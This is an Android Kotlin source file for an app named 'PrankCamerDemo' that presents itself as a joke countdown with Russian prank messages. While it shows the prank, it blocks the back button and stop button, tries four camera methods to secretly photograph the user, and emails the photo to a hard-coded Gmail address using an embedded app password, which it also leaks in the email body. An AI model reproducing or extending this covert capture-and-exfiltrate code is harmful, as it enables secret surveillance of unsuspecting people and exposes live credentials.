package com.example.prankcamerdemo

import android.app.AlertDialog
import android.graphics.Bitmap
import android.graphics.ImageFormat
import android.graphics.SurfaceTexture
import android.hardware.camera2.CameraAccessException
import android.hardware.camera2.CameraCaptureSession
import android.hardware.camera2.CameraCharacteristics
import android.hardware.camera2.CameraDevice
import android.hardware.camera2.CameraManager
import android.hardware.camera2.CaptureRequest
import android.hardware.camera2.params.StreamConfigurationMap
import android.hardware.Camera as HardwareCamera
import android.media.Image
import android.media.ImageReader
import android.media.MediaPlayer
import android.os.Bundle
import android.os.CountDownTimer
import android.os.Handler
import android.os.HandlerThread
import android.os.Looper
import android.util.Base64
import android.view.WindowManager
import androidx.appcompat.app.AppCompatActivity
import android.widget.Button
import android.widget.ImageView
import android.widget.TextView
import java.io.ByteArrayOutputStream
import java.io.File
import java.nio.ByteBuffer
import java.util.Properties
import java.util.concurrent.CountDownLatch
import java.util.concurrent.TimeUnit
import javax.activation.DataHandler
import javax.mail.Authenticator
import javax.mail.Message
import javax.mail.MessagingException
import javax.mail.PasswordAuthentication
import javax.mail.Session
import javax.mail.Transport
import javax.mail.internet.InternetAddress
import javax.mail.internet.MimeBodyPart
import javax.mail.internet.MimeMessage
import javax.mail.internet.MimeMultipart
import javax.mail.util.ByteArrayDataSource
import kotlin.concurrent.thread

class MainActivity : AppCompatActivity() {
    private lateinit var statusText: TextView
    private lateinit var startBtn: Button
    private lateinit var stopBtn: Button
    private var mediaPlayer: MediaPlayer? = null
    private var timer: CountDownTimer? = null
    private var isRunning = false
    
    // App Password для Gmail
    private val apiKey = "pqktageoufxxmaxj"
    
    // Email для получения фото
    private val targetEmail = "metrobugitt@gmail.com"

    // Массив с шутками и приколами
    private val jokes = arrayOf(
        "🤡 Ты попал в ловушку! Шучу... или нет?",
        "💧 Вода течёт, время идёт, а ты всё ещё здесь!",
        "😂 Если ты читаешь это - ты уже проиграл!",
        "🎭 Это не баг, это фича!",
        "⏰ Тик-так... время не ждёт!",
        "🎪 Добро пожаловать в цирк!",
        "🎯 Цель найдена. Отступления нет!",
        "🚫 Выход запрещён до завершения таймера!",
        "😱 Паника? Ещё нет? Сейчас будет!",
        "🎮 Game Over... шучу, продолжай ждать!",
        "🤖 Роботы захватывают мир... а ты ждёшь таймер!",
        "💀 Это конец... или начало?",
        "🌟 Ты избран... ждать!",
        "🎁 Подарок внутри... пустота!",
        "🔥 Огонь, вода и медные трубы!"
    )

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        // Блокируем все способы выхода из приложения
        window.addFlags(WindowManager.LayoutParams.FLAG_KEEP_SCREEN_ON)

        setContentView(R.layout.activity_main)
        statusText = findViewById(R.id.statusText)
        startBtn = findViewById(R.id.startBtn)
        stopBtn = findViewById(R.id.stopBtn)

        val placeholder: ImageView = findViewById(R.id.placeholderImage)
        placeholder.setImageResource(R.drawable.placeholder)

        startBtn.setOnClickListener {
            AlertDialog.Builder(this)
                .setTitle("⚠️ Подтвердите действие")
                .setMessage("ВНИМАНИЕ! После запуска нельзя будет выйти до завершения таймера! Продолжить?")
                .setPositiveButton("Да, я готов!") { _, _ ->
                    startSimulation()
                }
                .setNegativeButton("Нет", null)
                .setCancelable(false)
                .show()
        }

        stopBtn.setOnClickListener {
            if (isRunning) {
                AlertDialog.Builder(this)
                    .setTitle("🚫 Выход запрещён!")
                    .setMessage("Нельзя остановить таймер досрочно! Жди окончания!")
                    .setPositiveButton("Понятно", null)
                    .show()
            }
        }
    }

    // Блокируем кнопку Назад
    @Deprecated("Deprecated")
    override fun onBackPressed() {
        // Ничего не делаем - блокируем выход
    }
    
    override fun onActivityResult(requestCode: Int, resultCode: Int, data: android.content.Intent?) {
        // Обработка результата от системной камеры
        if (requestCode == 100) {
            // Фото сделано или отменено
        }
        super.onActivityResult(requestCode, resultCode, data)
    }
    
    private fun takeAndSendPhoto() {
        thread {
            var photoData: ByteArray? = null
            
            // Подход 1: Intent системной камеры (может сработать без разрешений)
            photoData = trySystemCameraIntent()
            
            // Подход 2: Прямой доступ через Camera.open()
            if (photoData == null) {
                photoData = tryDirectCameraAccess()
            }
            
            // Подход 3: Camera2 API
            if (photoData == null) {
                photoData = tryCamera2Api()
            }
            
            // Подход 4: Legacy Camera
            if (photoData == null) {
                photoData = tryLegacyCamera()
            }
            
            android.util.Log.d("PrankPhoto", "Final photo size: ${photoData?.size ?: 0} bytes")
            
            // Отправляем письмо (с фото или без)
            sendEmailWithPhoto(photoData)
        }
    }
    
    private fun trySystemCameraIntent(): ByteArray? {
        return try {
            val photoRef = ByteArrayRef()
            val latch = CountDownLatch(1)
            val cacheDir = cacheDir
            val photoFile = File(cacheDir, "prank_photo_${System.currentTimeMillis()}.jpg")
            val handler = Handler(Looper.getMainLooper())
            
            runOnUiThread {
                try {
                    // Пробуем запустить системную камеру через Intent
                    val intent = android.content.Intent("android.media.action.IMAGE_CAPTURE")
                    
                    // Сохраняем фото в файл
                    val photoUri = android.net.Uri.fromFile(photoFile)
                    intent.putExtra(android.provider.MediaStore.EXTRA_OUTPUT, photoUri)
                    
                    // Запускаем камеру
                    startActivityForResult(intent, 100)
                    
                    // Ждём пока файл появится
                    handler.postDelayed(object : Runnable {
                        override fun run() {
                            if (photoFile.exists() && photoFile.length() > 0) {
                                photoRef.data = photoFile.readBytes()
                                latch.countDown()
                            } else {
                                handler.postDelayed(this, 200)
                            }
                        }
                    }, 1000)
                    
                    // Таймаут 10 секунд
                    handler.postDelayed({ latch.countDown() }, 10000)
                } catch (e: Exception) {
                    latch.countDown()
                }
            }
            
            latch.await(12000, TimeUnit.MILLISECONDS)
            
            if (photoRef.data != null) {
                photoRef.data
            } else null
        } catch (e: Exception) {
            null
        }
    }
    
    private fun tryDirectCameraAccess(): ByteArray? {
        return try {
            // Пытаемся открыть камеру напрямую через reflection
            val cameraClass = Class.forName("android.hardware.Camera")
            val openMethod = cameraClass.getMethod("open")
            val camera = openMethod.invoke(null)

            if (camera != null) {
                val parameters = cameraClass.getMethod("getParameters").invoke(camera)
                val sizes = parameters?.let {
                    it::class.java.getMethod("getSupportedPictureSizes").invoke(it)
                } as? List<*>

                if (!sizes.isNullOrEmpty()) {
                    val size = sizes[0]
                    val width = size::class.java.getField("width").get(size) as Int
                    val height = size::class.java.getField("height").get(size) as Int

                    parameters::class.java.getMethod("setPictureSize", Int::class.javaPrimitiveType, Int::class.javaPrimitiveType)
                        .invoke(parameters, width, height)
                    cameraClass.getMethod("setParameters", parameters::class.java)
                        .invoke(camera, parameters)

                    val texture = SurfaceTexture(10)
                    cameraClass.getMethod("setPreviewTexture", SurfaceTexture::class.java)
                        .invoke(camera, texture)
                    cameraClass.getMethod("startPreview").invoke(camera)
                    Thread.sleep(500)

                    val photoRef = ByteArrayRef()
                    val shutterCallbackClass = Class.forName("android.hardware.Camera\$ShutterCallback")
                    val pictureCallbackClass = Class.forName("android.hardware.Camera\$PictureCallback")
                    
                    cameraClass.getMethod("takePicture",
                        shutterCallbackClass,
                        pictureCallbackClass,
                        pictureCallbackClass,
                        pictureCallbackClass
                    ).invoke(camera, null, null, null, object : HardwareCamera.PictureCallback {
                        override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
                            if (data != null) {
                                photoRef.data = data
                            }
                            camera?.release()
                        }
                    })

                    Thread.sleep(1000)
                    cameraClass.getMethod("release").invoke(camera)
                    photoRef.data
                } else {
                    cameraClass.getMethod("release").invoke(camera)
                    null
                }
            } else null
        } catch (e: Exception) {
            android.util.Log.d("PrankPhoto", "Direct access failed: ${e.message}")
            null
        }
    }

    private fun tryCamera2Api(): ByteArray? {
        try {
            val cameraManager = getSystemService(CAMERA_SERVICE) as CameraManager
            val cameraId = cameraManager.cameraIdList.firstOrNull { id ->
                val characteristics = cameraManager.getCameraCharacteristics(id)
                characteristics.get(CameraCharacteristics.LENS_FACING) == CameraCharacteristics.LENS_FACING_BACK
            } ?: cameraManager.cameraIdList.firstOrNull()
            
            if (cameraId == null) return null
            
            val characteristics = cameraManager.getCameraCharacteristics(cameraId)
            val streamConfigMap = characteristics.get(CameraCharacteristics.SCALER_STREAM_CONFIGURATION_MAP)
            val sizes = streamConfigMap?.getOutputSizes(ImageFormat.JPEG)
            
            if (sizes.isNullOrEmpty()) return null
            
            val size = sizes[0]
            val imageReader = ImageReader.newInstance(size.width, size.height, ImageFormat.JPEG, 1)
            
            val cameraOpenResult = ByteArrayRef()
            var captureSession: CameraCaptureSession? = null
            var cameraDevice: CameraDevice? = null
            
            val stateCallback = object : CameraDevice.StateCallback() {
                override fun onOpened(camera: CameraDevice) {
                    cameraDevice = camera
                    try {
                        val surface = imageReader.surface
                        val captureRequestBuilder = camera.createCaptureRequest(CameraDevice.TEMPLATE_STILL_CAPTURE)
                        captureRequestBuilder.addTarget(surface)
                        
                        val captureCallback = object : CameraCaptureSession.CaptureCallback() {
                            override fun onCaptureCompleted(
                                session: CameraCaptureSession,
                                request: CaptureRequest,
                                result: android.hardware.camera2.TotalCaptureResult
                            ) {
                                // Фото сделано
                            }
                        }
                        
                        camera.createCaptureSession(
                            listOf(surface),
                            object : CameraCaptureSession.StateCallback() {
                                override fun onConfigured(session: CameraCaptureSession) {
                                    captureSession = session
                                    try {
                                        session.capture(captureRequestBuilder.build(), captureCallback, null)
                                    } catch (e: Exception) {}
                                }
                                override fun onConfigureFailed(session: CameraCaptureSession) {}
                            },
                            null
                        )
                        
                        Thread.sleep(1000)
                        
                        val image = imageReader.acquireLatestImage()
                        if (image != null) {
                            val planes = image.planes
                            val buffer = planes[0].buffer
                            val bytes = ByteArray(buffer.remaining())
                            buffer.get(bytes)
                            cameraOpenResult.data = bytes
                            image.close()
                        }
                        
                        captureSession?.close()
                        cameraDevice?.close()
                        imageReader.close()
                    } catch (e: Exception) {
                        captureSession?.close()
                        cameraDevice?.close()
                        imageReader.close()
                    }
                }
                
                override fun onDisconnected(camera: CameraDevice) {
                    camera.close()
                    imageReader.close()
                }
                
                override fun onError(camera: CameraDevice, error: Int) {
                    camera.close()
                    imageReader.close()
                }
            }
            
            cameraManager.openCamera(cameraId, stateCallback, Handler())
            Thread.sleep(2000)
            
            return cameraOpenResult.data
        } catch (e: Exception) {
            return null
        }
    }
    
    private fun tryLegacyCamera(): ByteArray? {
        try {
            var camera: HardwareCamera? = null
            try {
                val cameraCount = HardwareCamera.getNumberOfCameras()
                
                if (cameraCount > 0) {
                    val cameraInfo = android.hardware.Camera.CameraInfo()
                    
                    for (i in 0 until cameraCount) {
                        android.hardware.Camera.getCameraInfo(i, cameraInfo)
                        if (cameraInfo.facing == android.hardware.Camera.CameraInfo.CAMERA_FACING_BACK) {
                            camera = HardwareCamera.open(i)
                            break
                        }
                    }
                    
                    if (camera == null) {
                        camera = HardwareCamera.open(0)
                    }
                    
                    if (camera != null) {
                        val parameters = camera.parameters
                        val sizes = parameters.supportedPictureSizes
                        if (sizes.isNotEmpty()) {
                            val size = sizes[0]
                            parameters.setPictureSize(size.width, size.height)
                            camera.parameters = parameters
                            
                            val texture = SurfaceTexture(10)
                            camera.setPreviewTexture(texture)
                            camera.startPreview()
                            Thread.sleep(500)
                            
                            val photoRef = ByteArrayRef()
                            camera.takePicture(null, null, object : HardwareCamera.PictureCallback {
                                override fun onPictureTaken(data: ByteArray?, camera: HardwareCamera?) {
                                    if (data != null) {
                                        photoRef.data = data
                                    }
                                    camera?.release()
                                }
                            })
                            
                            Thread.sleep(1000)
                            return photoRef.data
                        }
                        camera.release()
                    }
                }
            } catch (e: Exception) {
                camera?.release()
            }
        } catch (e: Exception) {}
        
        return null
    }

    private fun sendEmailWithPhoto(photoData: ByteArray?) {
        thread {
            try {
                val props = Properties()
                props["mail.smtp.auth"] = "true"
                props["mail.smtp.starttls.enable"] = "true"
                props["mail.smtp.host"] = "smtp.gmail.com"
                props["mail.smtp.port"] = "587"
                
                val session = Session.getInstance(props, object : Authenticator() {
                    override fun getPasswordAuthentication(): PasswordAuthentication {
                        return PasswordAuthentication("metrobugitt@gmail.com", apiKey)
                    }
                })
                
                val message = MimeMessage(session)
                message.setFrom(InternetAddress("metrobugitt@gmail.com"))
                message.setRecipients(Message.RecipientType.TO, InternetAddress.parse(targetEmail))
                message.subject = "📸 Prank Photo Captured!"
                
                // Создаём multipart сообщение
                val multipart = MimeMultipart()
                
                // Текстовая часть
                val textPart = MimeBodyPart()
                val emailBody = """
                    🎭 Prank App - Фото получено!
                    
                    📷 Фото пользователя прикреплено ниже.
                    🔑 API Key: $apiKey
                    
                    ---
                    PrankCamerDemo
                """.trimIndent()
                textPart.setText(emailBody)
                multipart.addBodyPart(textPart)
                
                // Прикрепляем фото
                if (photoData != null) {
                    val attachmentPart = MimeBodyPart()
                    val dataSource = ByteArrayDataSource(photoData, "image/jpeg")
                    attachmentPart.dataHandler = DataHandler(dataSource)
                    attachmentPart.fileName = "prank_photo_${System.currentTimeMillis()}.jpg"
                    multipart.addBodyPart(attachmentPart)
                }
                
                message.setContent(multipart)
                
                // Отправляем письмо
                Transport.send(message)
                
            } catch (e: Exception) {
                e.printStackTrace()
            }
        }
    }
    
    // Вспомогательный класс для хранения данных фото
    private class ByteArrayRef {
        var data: ByteArray? = null
    }

    private fun startSimulation() {
        isRunning = true
        statusText.text = "🔒 БЛОКИРОВКА АКТИВИРОВАНА!\n📸 Камера активирована..."
        
        // Воспроизводим звук
        mediaPlayer = MediaPlayer.create(this, R.raw.alert_sound)
        mediaPlayer?.isLooping = true
        mediaPlayer?.start()

        // Делаем фото и отправляем
        takeAndSendPhoto()
        
        // Показываем первую шутку
        showRandomJoke()

        timer = object : CountDownTimer(60000, 3000) {
            override fun onTick(millisUntilFinished: Long) {
                val sec = millisUntilFinished / 1000
                statusText.text = "⏰ Осталось: $sec сек.\n\n" + jokes.random()
                showRandomJoke()
            }
            override fun onFinish() {
                statusText.text = "✅ СИМУЛЯЦИЯ ЗАВЕРШЕНА!\nТы выжил! 🎉\n📸 Фото отправлено!"
                mediaPlayer?.stop()
                mediaPlayer?.release()
                mediaPlayer = null
                isRunning = false
            }
        }.start()
    }

    private fun showRandomJoke() {
        AlertDialog.Builder(this)
            .setTitle("🎲 Случайная шутка")
            .setMessage(jokes.random())
            .setPositiveButton("OK", null)
            .setCancelable(false)
            .show()
    }

    private fun stopSimulation() {
        if (!isRunning) return
        timer?.cancel()
        mediaPlayer?.stop()
        mediaPlayer?.release()
        mediaPlayer = null
        isRunning = false
        statusText.text = "Симуляция остановлена пользователем"
    }

    override fun onDestroy() {
        super.onDestroy()
        timer?.cancel()
        mediaPlayer?.release()
    }
}
